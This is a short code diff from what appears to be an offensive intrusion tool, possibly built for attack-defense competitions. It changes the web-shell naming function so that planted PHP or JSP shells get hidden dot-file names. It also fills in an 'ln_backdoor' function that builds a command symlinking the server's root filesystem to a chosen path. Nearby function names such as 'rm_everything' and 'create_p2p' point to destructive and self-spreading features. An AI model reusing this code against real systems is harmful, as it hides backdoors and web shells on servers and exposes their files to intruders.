@@ -100,9 +100,9 @@ def random_ua():
 
 def shell_hash(target,target_port):
 	if shell_type==1 or shell_type==2:
-		shell_name = "" + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
+		shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
 	else:
-		shell_name = "" + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".jsp"
+		shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".jsp"
 
 	shell_arg = hashlib.md5(shell_salt_2 + target + ":" + target_port).hexdigest()
 	return shell_name,shell_arg
@@ -338,7 +338,9 @@ def rm_everything(target,target_port,cmd):
 	return cmd
 
 def ln_backdoor(target,target_port,cmd):
-	cmd = ''
+	cmd = 'ln -s / %s'%ln_path
+	debug_print(cmd)
+	return cmd
 
 # This function is designed to generate a p2p network
 def create_p2p(target,target_port,cmd):
